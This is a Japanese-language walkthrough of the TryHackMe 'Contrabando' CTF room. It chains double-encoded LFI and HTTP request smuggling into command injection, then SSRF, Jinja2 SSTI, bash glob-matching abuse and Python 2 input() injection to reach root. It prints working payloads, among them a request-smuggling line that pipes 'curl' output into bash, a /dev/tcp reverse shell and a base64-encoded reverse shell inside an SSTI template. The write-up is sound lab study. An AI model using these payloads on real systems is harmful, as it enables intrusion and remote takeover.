# Contrabando CTF

https://tryhackme.com/room/contrabando

## Enumeration

```shell
TARGET=10.146.180.104
sudo bash -c "echo $TARGET   contra.thm >> /etc/hosts"
```

### ポートスキャン

```shell
sudo nmap -vv -sS -p- $TARGET

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 63
```

```sh
root@ip-10-146-108-12:~# nikto -p 80 -T 1 2 3 -h $TARGET
- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          10.146.180.104
+ Target Hostname:    contra.thm
+ Target Port:        80
+ Start Time:         2026-10-06 05:47:55 (GMT0)
---------------------------------------------------------------------------
+ Server: Apache/2.4.55 (Unix)
+ Server leaks inodes via ETags, header found with file /, fields: 0x39a 0x61bab54709d80 
+ The anti-clickjacking X-Frame-Options header is not present.
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Allowed HTTP Methods: HEAD, GET, POST, OPTIONS, TRACE 
+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
+ 1707 items checked: 0 error(s) and 4 item(s) reported on remote host
+ End Time:           2026-10-06 05:47:58 (GMT0) (3 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

HTTPアクセスすると、http://contra.thm/page/home.html のリンクが表示されるが、`Our password generator is currently down.` と表示されるだけ。

### ディレクトリ列挙

```sh
dirsearch -u http://$TARGET -e py,txt,py.bak

[05:50:20] 200 -  820B  - /cgi-bin/printenv
[05:50:20] 200 -    1KB - /cgi-bin/test-cgi
```

```shell
root@ip-10-146-108-12:~# dirsearch -u http://$TARGET/page/ -e pl,pl.bak

[06:12:21] Starting: page/
[06:13:21] 200 -  445B  - /page/home.html
[06:13:24] 200 -  140B  - /page/index.php
```

### cgi-bin

- /cgi-bin/printenv
- /cgi-bin/test-cgi

以外のCGIファイルは見つからなかった。

### エラー

http://contra.thm/page/ をリクエストしたら下記エラーが出た。

```
Warning: readfile(): Filename cannot be empty in /var/www/html/index.php on line 5
```

/page/index.php をリクエストしたらPHPのコードが返った。

```php
<?php 

$page = $_GET['page'];
if (isset($page)) {
    readfile($page);
} else {
    header('Location: /index.php?page=home.html');
}

?>
```

http://contra.thm/page/?page=/etc/passwd でも `Filename cannot be empty` のエラーになる。

http://contra.thm/page/foo のとき、pageパラメータの値がfooになる形だった。

二重エンコードで /etc/passwd を取得できた。

```sh
$ curl "http://contra.thm/page/%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%36%35%25%37%34%25%36%33%25%32%66%25%37%30%25%36%31%25%37%33%25%37%33%25%37%37%25%36%34"
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
```

ログイン可能なユーザーは root しか存在しない。  

/proc の下も見てみたが、あまり使えそうな情報が出てこなかった。

ファジングして gen.php を発見。

```sh
ffuf -u http://$TARGET/page/FUZZ.php -w ./dirlist.txt -fr 'failed to open stream'

gen                     [Status: 200, Size: 392, Words: 65, Lines: 15, Duration: 26ms]
index                   [Status: 200, Size: 148, Words: 17, Lines: 11, Duration: 68ms]
```

gen.php

```php
curl http://$TARGET/page/gen.php
<?php
function generateRandomPassword($length) {
    $password = exec("tr -dc 'a-zA-Z0-9' < /dev/urandom | head -c " . $length);
    return $password;
}

if(isset($_POST['length'])){
        $length = $_POST['length'];
        $randomPassword = generateRandomPassword($length);
        echo $randomPassword;
}else{
    echo "Please insert the length parameter in the URL";
}
?>
```

OSコマンドインジェクションが成立しそうな形ではあるが、gen.php をどうやってトリガーするかが問題。

http://127.0.0.1:8080/gen.php を readfile に渡すことでGETによる実行はできているが、コマンドインジェクションにはPOSTが必要。

```sh
$ curl http://$TARGET/page/%25%36%38%25%37%34%25%37%34%25%37%30%25%33%61%25%32%66%25%32%66%25%33%31%25%33%32%25%33%37%25%32%65%25%33%30%25%32%65%25%33%30%25%32%65%25%33%31%25%33%61%25%33%38%25%33%30%25%33%38%25%33%30%25%32%66%25%36%37%25%36%35%25%36%65%25%32%65%25%37%30%25%36%38%25%37%30 
Please insert the length parameter in the URL 
```

## リクエストスマグリング

ペイロードをHTTPでホスト。

```sh
$ cat index.html
/bin/bash -i >& /dev/tcp/192.168.128.138/443 0>&1
```

Burp Repeater でスマグリングのリクエストを送る。

```sh
GET /page/gen.php%20HTTP/1.1%0d%0aHost:%20backend-server:8080%0d%0a%0d%0aPOST%20/gen.php%20HTTP/1.1%0d%0aHost:%20backend-server:8080%0d%0aContent-Type:%20application/x-www-form-urlencoded%0d%0aContent-Length:%2037%0d%0a%0d%0alength=1;$(curl+192.168.128.138|bash) HTTP/1.1
Host: contra.thm
```

リバースシェル取得成功。

```sh
$ nc -nlvp 443 
listening on [any] 443 ...
connect to [192.168.128.138] from (UNKNOWN) [10.144.134.191] 39772
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
www-data@124a042cc76c:/var/www/html$ 
```

## www-data

172.18.0.1 で5000ポートが開いている。

```sh
www-data@124a042cc76c:/tmp$ ./rustscan --top -a 172.18.0.1,172.18.0.2 --accessible
<ustscan --top -a 172.18.0.1,172.18.0.2 --accessible
File limit higher than batch size. Can increase speed by increasing batch size '-b 1048476'.
Open 172.18.0.1:80
Open 172.18.0.2:80
Open 172.18.0.1:22
Open 172.18.0.1:5000
```

5000ポートはHTTPサーバー。  
`website_url` をPOSTする画面が表示されている。

```html
www-data@124a042cc76c:/tmp$ curl http://172.18.0.1:5000/
curl http://172.18.0.1:5000/
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   421  100   421    0     0   3827      0 --:--:-- --:--:-- --:--:--  3862
<!DOCTYPE html>
<html>
<head>
    <title>Website Display</title>
</head>
<body>
    <h1>Fetch Website Content</h1>
    <h2>Currently in Development</h2>
    <form method="POST">
        <label for="website_url">Enter Website URL:</label>
        <input type="text" name="website_url" id="website_url" required>
        <button type="submit">Fetch Website</button>
    </form>
    <div>
        
    </div>
</body>
```

website_url で SSRFが可能。問題は何を狙うか？ということ。

```sh
# Webトップページの画面が返る
www-data@124a042cc76c:/tmp$ curl -X POST -d 'website_url=http://localhost/' http://172.18.0.1:5000/

# 404表示の画面が返る
www-data@124a042cc76c:/tmp$ curl -X POST -d 'website_url=http://localhost/noexist' http://172.18.0.1:5000/
```

file:// スキームを使ってローカルファイルを読めた。

```sh
www-data@124a042cc76c:/tmp$ curl -X POST -d 'website_url=file:///etc/passwd' http://172.18.0.1:5000/
...
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
fwupd-refresh:x:111:116:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:113:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
hansolo:x:1000:1000::/home/hansolo:/bin/bash
```

/proc/self/cmdline  
Flaskのソースコードパス判明。

```sh
www-data@124a042cc76c:/tmp$ curl -X POST -d 'website_url=file:///proc/self/cmdline' http://172.18.0.1:5000/
...
/usr/bin/python3/home/hansolo/app/app.py
```

/usr/bin/python3/home/hansolo/app/app.py  
SSTIの脆弱性がありそう。

```python
from flask import Flask, render_template, render_template_string, request
import pycurl
from io import BytesIO

app = Flask(__name__)

@app.route('/', methods=['GET', 'POST'])
def display_website():
    if request.method == 'POST':
        website_url = request.form['website_url']

        # Use pycurl to fetch the content of the website
        buffer = BytesIO()
        c = pycurl.Curl()
        c.setopt(c.URL, website_url)
        c.setopt(c.WRITEDATA, buffer)
        c.perform()
        c.close()

        # Extract the content and convert it to a string
        content = buffer.getvalue().decode('utf-8')
        buffer.close()
        website_content = '''
        <!DOCTYPE html>
<html>
<head>
    <title>Website Display</title>
</head>
<body>
    <h1>Fetch Website Content</h1>
    <h2>Currently in Development</h2>
    <form method="POST">
        <label for="website_url">Enter Website URL:</label>
        <input type="text" name="website_url" id="website_url" required>
        <button type="submit">Fetch Website</button>
    </form>
    <div>
        %s
    </div>
</body>
</html>'''%content

        return render_template_string(website_content)

    return render_template('index.html')

if __name__ == '__main__':
    app.run(host="0.0.0.0",debug=False)
```

## SSTI

Jinja2のパターンでSSTI成功。

```sh
$ cat sstitest  
{{7*'7'}}
```

```sh
www-data@124a042cc76c:/tmp$ curl -X POST -d 'website_url=http://192.168.128.138/sstitest' http://172.18.0.1:5000/
...
7777777
```

リバースシェル取得成功。

```sh
$ cat ssti
{{request.application.__globals__.__builtins__.__import__('os').popen('echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguMTI4LjEzOC84MDg5IDA+JjE=|base64 -d|bash').read()}}
```

```sh
www-data@124a042cc76c:/tmp$ curl -X POST -d 'website_url=http://192.168.128.138/ssti' http://172.18.0.1:5000/
```

```sh
$ nc -nlvp 8089
listening on [any] 8089 ...
connect to [192.168.128.138] from (UNKNOWN) [10.144.134.191] 49564
bash: cannot set terminal process group (724): Inappropriate ioctl for device
bash: no job control in this shell
hansolo@contrabando:~$ id
id
uid=1000(hansolo) gid=1000(hansolo) groups=1000(hansolo)
```

フラグ１。

```sh
hansolo@contrabando:~$ cat /home/hansolo/hansolo_userflag.txt
THM{[REDACTED]}
```

## 権限昇格

```sh
hansolo@contrabando:~$ sudo -l
sudo -l
Matching Defaults entries for hansolo on contrabando:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User hansolo may run the following commands on contrabando:
    (root) NOPASSWD: /usr/bin/bash /usr/bin/vault
    (root) /usr/bin/python* /opt/generator/app.py
```

/usr/bin/vault を実行するとパスワードが要求される。  

```sh
hansolo@contrabando:~$ sudo /usr/bin/bash /usr/bin/vault
sudo /usr/bin/bash /usr/bin/vault
aakeekk
Password does not match!
```

```sh
hansolo@contrabando:~$ cat /usr/bin/vault
cat /usr/bin/vault
#!/bin/bash

check () {
        if [ ! -e "$file_to_check" ]; then
            /usr/bin/echo "File does not exist."
            exit 1
        fi
        compare
}


compare () {
        content=$(/usr/bin/cat "$file_to_check")

        read -s -p "Enter the required input: " user_input

        if [[ $content == $user_input ]]; then
            /usr/bin/echo ""
            /usr/bin/echo "Password matched!"
            /usr/bin/cat "$file_to_print"
        else
            /usr/bin/echo "Password does not match!"
        fi
}

file_to_check="/root/password"
file_to_print="/root/secrets"

check
```

/opt/generator/app.py

```python
import random
import string

def generate_password(length):
    characters = string.ascii_letters + string.digits + string.punctuation
    random.seed()
    secret = input("Any words you want to add to the password? ")
    password_characters = list(characters + secret)
    random.shuffle(password_characters)
    password = ''.join(password_characters[:length])

    return password

try:
    length = int(raw_input("Enter the desired length of the password: "))
except NameError:
    length = int(input("Enter the desired length of the password: "))
except ValueError:
    print("Invalid input. Using default length of 12.")
    length = 12

password = generate_password(length)
print("Generated Password:", password)
```

`/root/password` とのつながりが見えない。

下記の部分にグロブマッチングの脆弱性がある。

```sh
read -s -p "Enter the required input: " user_input
if [[ $content == $user_input ]]; then
```

/root/secret はフラグではなかった。

```sh
hansolo@contrabando:~$ sudo /usr/bin/bash /usr/bin/vault
sudo /usr/bin/bash /usr/bin/vault
*

Password matched!
1. Lightsaber Colors: Lightsabers in Star Wars can come in various colors, and the color often signifies the Jedi's role or affiliation. For example, blue and green lightsabers are commonly associated with Jedi Knights, while red lightsabers are typically used by Sith. However, there are exceptions, and the color can also represent other factors.

2. Darth Vader's Breathing: The iconic sound of Darth Vader's breathing was created by sound designer Ben Burtt. He achieved this effect by recording himself breathing through a scuba regulator. The sound became one of the most recognizable and menacing elements of the character.

3. Ewok Language: The Ewoks, the small furry creatures from the forest moon of Endor in "Return of the Jedi," speak a language called Ewokese. The language is a combination of various Tibetan, Nepalese, and Kalmyk phrases, as well as some manipulated dialogue from the Quechua language.

4. Han Solo's Carbonite Freeze: In "Star Wars: Episode V - The Empire Strikes Back," Han Solo is frozen in carbonite. The famous line, "I love you," "I know," was actually improvised by Harrison Ford. The original script had Han responding with "I love you too," but Ford felt that Han's character wouldn't say that, so he ad-libbed the now-famous line.

5. Yoda's Species and Name: Yoda's species and homeworld are never revealed in the Star Wars films, and George Lucas has been adamant about keeping this information a mystery. Additionally, the name "Yoda" was chosen simply because George Lucas liked the sound of it.
```

ブロブマッチングを用いてパスワードを1文字ずつ特定することが可能。  
[スクリプト](https://jaxafed.github.io/posts/tryhackme-contrabando/#brute-forcing-the-password)で hansolo ユーザーのパスワードを入手。以後SSH接続できるのでほっと一息。

```sh
hansolo@contrabando:~$ python3 ./brute.py
python3 ./brute.py
[+] Final Password: [REDACTED]
```

## input

pythonのinput関数でコード実行を試みる。

python3では失敗。

```sh
hansolo@contrabando:~$ sudo /usr/bin/python3 /opt/generator/app.py
Enter the desired length of the password: __import__("os").system("ls -al /root")
Traceback (most recent call last):
  File "/opt/generator/app.py", line 15, in <module>
    length = int(raw_input("Enter the desired length of the password: "))
NameError: name 'raw_input' is not defined

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File "/opt/generator/app.py", line 17, in <module>
    length = int(input("Enter the desired length of the password: "))
ValueError: invalid literal for int() with base 10: '__import__("os").system("ls -al /root")'
```

python2で成功！  
1回目の入力は raw_input() なので、2回目の入力でコード投入するのがポイント。

```sh
hansolo@contrabando:~$ sudo /usr/bin/python2 /opt/generator/app.py
Enter the desired length of the password: 5
Any words you want to add to the password? __import__("os").system("ls -al /root")
total 56
drwx------  8 root root 4096 May  5  2025 .
drwxr-xr-x 19 root root 4096 Aug  1  2023 ..
lrwxrwxrwx  1 root root    9 Jun 24  2024 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Dec  5  2019 .bashrc
drwx------  2 root root 4096 Aug  8  2023 .cache
drwx------  3 root root 4096 Aug  8  2023 .docker
-rw-r--r--  1 root root   13 Nov 14  2023 password
-rw-r--r--  1 root root  161 Dec  5  2019 .profile
-rw-r-----  1 root root   25 Nov 14  2023 root.txt
-rw-r--r--  1 root root 1543 Nov 14  2023 secrets
drwxr-xr-x  4 root root 4096 Oct 17  2023 smug
drwx------  3 root root 4096 Aug  1  2023 snap
drwx------  2 root root 4096 Aug  1  2023 .ssh
drwxr-xr-x  2 root root 4096 Oct 17  2023 .vim
-rw-r--r--  1 root root    0 Nov 14  2023 .vimfo
-rw-------  1 root root 1278 May  5  2025 .viminfo
Traceback (most recent call last):
  File "/opt/generator/app.py", line 22, in <module>
    password = generate_password(length)
  File "/opt/generator/app.py", line 8, in generate_password
    password_characters = list(characters + secret)
TypeError: cannot concatenate 'str' and 'int' objects
```

フラグファイルを読む。

```sh
hansolo@contrabando:~$ sudo /usr/bin/python2 /opt/generator/app.py
Enter the desired length of the password: 5
Any words you want to add to the password? __import__("os").system("cat /root/root.txt")
THM{[REDACTED]}
Traceback (most recent call last):
  File "/opt/generator/app.py", line 22, in <module>
    password = generate_password(length)
  File "/opt/generator/app.py", line 8, in generate_password
    password_characters = list(characters + secret)
TypeError: cannot concatenate 'str' and 'int' objects
```

## 振り返り

- これぞHardという劇難難易度。リクエストスマグリングとグロブマッチングの部分はウォークスルーに頼らないと進められなかった。
- LFIでの二重エンコードの理解が今まで曖昧だったが、理解が深まった。
- リクエストスマグリングの知識はあったが、CTFで遭遇したのは初な気がする。いざCTFでぶつかると非常に難しい。フロントエンドとバックエンドに分かれていることに気づくことがカギ。
- シェルのグロブマッチングは、1文字ずつ特定する手口含め勉強になった。
- 2回目のLFIからSSTIの流れと、inputコード実行の部分はスムーズにクリアできた。

## Tags

#tags:LFI #tags:リクエストスマグリング #tags:SSRF #tags:SSTI
